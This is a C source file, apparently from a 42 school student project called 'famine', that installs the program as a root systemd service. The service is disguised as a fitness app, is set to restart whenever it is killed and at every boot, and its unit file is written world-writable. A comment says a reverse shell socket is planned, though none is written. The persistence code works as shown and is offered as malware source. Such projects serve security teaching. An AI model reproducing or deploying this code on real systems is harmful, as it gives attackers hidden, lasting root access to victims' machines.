/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   service.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/04/18 15:18:30 by mbatty            #+#    #+#             */
/*   Updated: 2026/04/18 15:26:15 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <stdbool.h>
#include <string.h>
#include <sys/file.h>

# define SUPER_USER_LOCK_FILE "/var/lock/famine.lock"
# define WEAK_LOCK_FILE "/tmp/famine.lock"

# define SERVICE_FILE "/etc/systemd/system/famine.service"
# define SERVICE_START "sudo systemctl start famine.service &"
# define SERVICE_ENABLE "systemctl enable famine.service &"
# define SERVICE_FILE_CONTENT "\
[Unit]\n\
Description=Fitness app to track eating habits (for real, trust me...)\n\
After=network.target\n\
StartLimitIntervalSec=0\n\
[Service]\n\
Type=forking\n\
PIDFile=/var/lock/famine.lock\n\
Restart=always\n\
RestartSec=1\n\
User=root\n\
ExecStart=/bin/famine\n\
\n\
[Install]\n\
WantedBy=multi-user.target"

/*
	Setup program as a systemd service, it will restart when host reboots and when it is killed

	see SERVICE_FILE_CONTENT and SERVICE_FILE defines
*/
int	setup_service_file()
{
	int	fd;

	fd = open(SERVICE_FILE, O_CREAT | O_WRONLY | O_TRUNC, 0777);
	if (fd == -1)
		return (-1);

	write(fd, SERVICE_FILE_CONTENT, sizeof(SERVICE_FILE_CONTENT));
	system(SERVICE_ENABLE);
	system(SERVICE_START);
	return (0);
}

int	run_service()
{
	t_service_ctx	ctx = {0};

	ctx.super_user = getuid() == 0;

	if (lock_lock(&ctx, ctx.super_user ? SUPER_USER_LOCK_FILE : WEAK_LOCK_FILE) == -1)
		return (-1);

	if (ctx.super_user)
		setup_service_file();

	// run daemon service
	// idea is to run a socket to open a reverse shell

	return (unlock_lock(&ctx, ctx.super_user ? SUPER_USER_LOCK_FILE : WEAK_LOCK_FILE));
}
